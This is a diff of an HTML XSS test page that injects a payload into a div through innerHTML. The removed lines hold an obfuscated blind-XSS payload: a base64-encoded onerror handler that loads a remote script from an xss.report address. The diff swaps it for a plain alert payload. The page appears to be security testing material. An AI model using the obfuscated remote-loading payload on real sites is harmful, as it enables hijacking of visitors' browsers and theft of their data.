@@ -1,19 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Blind XSS Test</title>
+  <meta charset="UTF-8">
+  <title>XSS IMG Payload Test</title>
 </head>
 <body>
 
-  <!-- Titik injeksi di sini -->
   <div id="output"></div>
 
   <script>
-    // Contoh: payload disuntikkan ke innerHTML (simulasi vulnerability)
-    const payload = `"><img src=x id="dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FqaWdhbnRlbmciO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7" onerror="eval(atob(this.id))">`;
-
-    // Injeksi payload ke dalam DOM
+    const payload = `<img src="x" onerror="this.onerror=null;alert('XSS triggered')">`;
     document.getElementById('output').innerHTML = payload;
   </script>
 
